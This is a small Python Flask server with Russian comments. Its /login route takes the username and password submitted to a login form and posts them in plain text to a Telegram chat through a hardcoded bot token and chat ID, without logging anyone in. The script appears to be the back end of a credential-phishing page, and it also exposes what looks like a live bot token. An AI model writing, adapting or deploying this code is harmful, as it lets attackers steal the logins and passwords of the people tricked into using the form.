from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# Ваш токен бота
TELEGRAM_BOT_TOKEN = '7189410277:AAHb6Mk7uQRtBsoRjawuYPhKcnOHiFGWO00'
TELEGRAM_CHAT_ID = '-4175189112' # Ваш ID чата в телеграм

# Роут для обработки данных формы
@app.route('/login', methods=['POST'])
def login():
    # Получаем данные из запроса
    username = request.form['username']
    password = request.form['password']

    # Отправляем данные в телеграм
    send_to_telegram(username, password)

    return jsonify({'message': 'Данные отправлены успешно!'})

# Функция для отправки данных в телеграм
def send_to_telegram(username, password):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    data = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': f'Данные для входа: \nlog: {username}\npass: {password}'
    }
    response = requests.post(url, json=data)
    if response.status_code != 200:
        print('Ошибка при отправке сообщения в телеграм:', response.text)

if __name__ == '__main__':
    app.run(debug=True)
